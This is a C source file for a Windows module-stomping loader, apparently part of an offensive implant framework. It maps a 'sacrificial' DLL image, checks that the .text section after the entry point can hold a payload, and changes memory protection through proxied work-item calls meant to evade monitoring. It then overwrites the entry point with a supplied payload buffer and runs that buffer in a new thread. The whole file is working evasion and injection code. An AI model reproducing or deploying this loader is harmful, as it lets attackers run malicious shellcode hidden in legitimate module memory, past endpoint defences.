// ModuleStomp.c
#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"

extern WIN32_API g_Win32;

/*=========================================
@ MapSacrificialDll Function
===========================================*/
BOOL MapSacrificialDll(IN PCWSTR szSacrificialDllPath, OUT PVOID* ppModuleBase, OUT PVOID* pEntryPoint) {

	HANDLE						FileHandle			= { 0 },
								SectionHandle		= { 0 };
	PVOID						MappedModule		= { 0 };
	SIZE_T						ViewSize			= { 0 };
	PIMAGE_NT_HEADERS			NtHeaders			= { 0 };	
	NTSTATUS					Status				= { 0 };

	if (!szSacrificialDllPath || !ppModuleBase || !pEntryPoint)
		return FALSE;

#ifdef DEBUG
	DBGPRINT("[*] Mapping the DLL -> %ws \n", szSacrificialDllPath);
#endif

//-----------------------------------------------------

	if ((FileHandle = CreateFileW(szSacrificialDllPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		DBGPRINT("[-] CreateFileW Failed With Error -> [%d] - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	if (!NT_SUCCESS(Status = g_Win32.Nt.NtCreateSection(&SectionHandle, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, FileHandle))) {
#ifdef DEBUG
		DBGPRINT("[-] NtCreateSection Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	DELETE_HANDLE(FileHandle);
	
	if (!NT_SUCCESS(Status = g_Win32.Nt.NtMapViewOfSection(SectionHandle, NtCurrentProcess(), &MappedModule, 0x00, 0x00, NULL, &ViewSize, ViewShare, 0x00, PAGE_EXECUTE_READWRITE))) {
#ifdef DEBUG
		DBGPRINT("[-] NtMapViewOfSection Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}


	if (MappedModule == NULL) {
#ifdef DEBUG
		DBGPRINT("[-] Mapped Module Is Null - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	NtHeaders = (PIMAGE_NT_HEADERS)(U_PTR(MappedModule) + ((PIMAGE_DOS_HEADER)MappedModule)->e_lfanew);
	if (NtHeaders->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

#ifdef DEBUG
	DBGPRINT("[+] Success \n");
#endif

	*ppModuleBase			= MappedModule;
	*pEntryPoint			= (PVOID)(U_PTR(MappedModule) + NtHeaders->OptionalHeader.AddressOfEntryPoint);

Leave:
	DELETE_HANDLE(FileHandle);
	DELETE_HANDLE(SectionHandle);
	return (*ppModuleBase && *pEntryPoint) ? TRUE : FALSE;
}

/*=========================================
@ VerifyTextSectionSize Function
===========================================*/
BOOL VerifyTextSectionSize(IN PVOID pSacrificialModule, IN PVOID pEntryPoint, IN SIZE_T sBufferSize) {

	PIMAGE_NT_HEADERS					NtHeaders			= { 0 };
	PIMAGE_SECTION_HEADER				SectionHeader		= { 0 };
	PVOID								TextAddress			= { 0 };
	SIZE_T								TextSize			= { 0 },
										TextSizeLeft		= { 0 };

	if (pSacrificialModule == NULL || !pEntryPoint || !sBufferSize) {
#ifdef DEBUG
		DBGPRINT("[-] VerifyTextSectionSize -> Null Parameters - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE; 
	}

	//-------------------------------------------------------

	NtHeaders = (PIMAGE_NT_HEADERS)(U_PTR(pSacrificialModule) + ((PIMAGE_DOS_HEADER)pSacrificialModule)->e_lfanew);
	if (NtHeaders->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	SectionHeader = IMAGE_FIRST_SECTION(NtHeaders);

	for (DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {

		if ((*(ULONG*)SectionHeader[i].Name | 0x20202020) == 'xet.') {
			TextAddress		= (PVOID)(U_PTR(pSacrificialModule) + SectionHeader[i].VirtualAddress);
			TextSize		= SectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

	if (!TextAddress || !TextSize)
		return FALSE;

	TextSizeLeft = TextSize - (U_PTR(pEntryPoint) - U_PTR(TextAddress));
	
#ifdef DEBUG
	DBGPRINT("[i] Payload Size -> [%d] Bytes \n", sBufferSize);
	DBGPRINT("[i] Available Memory [Starting From The Entry Point] -> [%d] Bytes \n", TextSizeLeft);
#endif

	if (TextSizeLeft >= sBufferSize)
		return TRUE;

	return FALSE;
}

/*=========================================
@ StompTheModule Function
===========================================*/
BOOL StompTheModule(IN PCWSTR szSacrificialDllPath, IN PBYTE pBuffer, IN SIZE_T sBufferSize) {

	PVOID				SacrificialModule		= { 0 };
	PVOID				EntryPoint				= { 0 };
	HANDLE				ThreadHandle			= { 0 };
	DWORD				OldProtect				= { 0 };
	NTSTATUS			Status					= { 0 };

	if (!szSacrificialDllPath || !pBuffer || !sBufferSize)
		return FALSE;

//-------------------------------------------------------

	if (!MapSacrificialDll(szSacrificialDllPath, &SacrificialModule, &EntryPoint)) {
#ifdef DEBUG
		DBGPRINT("[-] Failed To Map The Sacrificial Dll - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//-------------------------------------------------------
	
	if (!VerifyTextSectionSize(SacrificialModule, EntryPoint, sBufferSize)) {
		return FALSE;
	}

//-------------------------------------------------------
	
	PVOID		BaseAddress		= EntryPoint;
	SIZE_T		RegionSize		= sBufferSize;

	if (!NT_SUCCESS(Status = WorkItemProxyNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, PAGE_READWRITE, &OldProtect))) {
#ifdef DEBUG
		DBGPRINT("[-] WorkItemProxyNtProtectVirtualMemory Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	MEMCPY(EntryPoint, pBuffer, sBufferSize);

//-------------------------------------------------------
	
	/*==================================================
	<<<!>>> YOUR PAYLOAD MAY REQUIRE RWX PERMS <<<!>>>
	====================================================*/
	if (!NT_SUCCESS(Status = WorkItemProxyNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, OldProtect, &OldProtect))) {
#ifdef DEBUG
		DBGPRINT("[-] WorkItemProxyNtProtectVirtualMemory[2] Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

//-------------------------------------------------------

	ThreadHandle = WorkItemProxyNtCreateThreadEx(NtCurrentProcess(), EntryPoint, NULL);
	
	if (ThreadHandle) {
		g_Win32.K32.WaitForSingleObject(ThreadHandle, 5000);
		return TRUE;
	}

	return FALSE;
}